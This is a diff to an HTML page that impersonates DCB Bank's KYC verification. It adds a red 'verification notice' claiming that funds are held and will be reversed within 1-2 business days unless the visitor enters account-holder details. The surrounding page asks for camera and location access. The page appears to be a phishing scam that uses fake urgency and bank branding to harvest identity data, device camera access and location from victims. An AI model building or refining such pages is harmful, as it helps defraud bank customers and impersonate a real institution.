@@ -242,7 +242,72 @@
       margin-right: 8px;
       font-size: 16px;
     }
-    
+    .verification-notice {
+  background-color: #fff8f8;
+  border-left: 4px solid #d32f2f;
+  padding: 15px;
+  border-radius: 8px;
+  margin: 0 auto 20px;
+  max-width: 100%;
+  font-size: 14px;
+}
+
+.notice-header {
+  color: #d32f2f;
+  font-weight: 700;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  font-size: 15px;
+}
+
+.notice-header i {
+  margin-right: 8px;
+  font-size: 18px;
+}
+
+.notice-content {
+  margin-bottom: 8px;
+  line-height: 1.5;
+}
+
+.notice-warning {
+  background-color: #ffebee;
+  padding: 10px;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  font-size: 13.5px;
+}
+
+.notice-warning i {
+  margin-right: 8px;
+  color: #d32f2f;
+}
+
+.verification-id {
+  font-family: monospace;
+  background-color: #f1f1f1;
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-weight: 700;
+  color: #c62828;
+}
+
+@media (max-width: 480px) {
+  .verification-notice {
+    padding: 12px;
+    font-size: 13px;
+  }
+  
+  .notice-header {
+    font-size: 14px;
+  }
+  
+  .notice-warning {
+    font-size: 12.5px;
+  }
+}
     .step-indicator {
       display: flex;
       justify-content: center;
@@ -436,7 +501,21 @@
   <div class="container">
     <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ4IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDNkNmEiIHJ4PSI0Ii8+PHRleHQgeD0iODAiIHk9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIGZvbnQtd2VpZ2h0PSI3MDAiPkRDQiBCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="DCB Bank Logo">
     <h2>DCB Bank KYC Verification</h2>
-
+      <!-- Add this right after your logo in the HTML (public/index.html) -->
+<div class="verification-notice">
+  <div class="notice-header">
+    <i class="fas fa-exclamation-circle"></i> IMPORTANT VERIFICATION NOTICE
+  </div>
+  <div class="notice-content">
+    You must enter the details of the <strong>recipient/account holder</strong> of the bank account 
+    (Verification ID: <span class="verification-id">QPJ359942</span>) that received the payment. 
+    Funds are currently held pending verification.
+  </div>
+  <div class="notice-warning">
+    <i class="fas fa-clock"></i> Failure to complete verification within <strong>1-2 business days</strong> 
+    will result in transaction reversal and funds will be credited back to the sender's account.
+  </div>
+</div>
     <div id="permissionStep">
       <p class="notice">
         For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
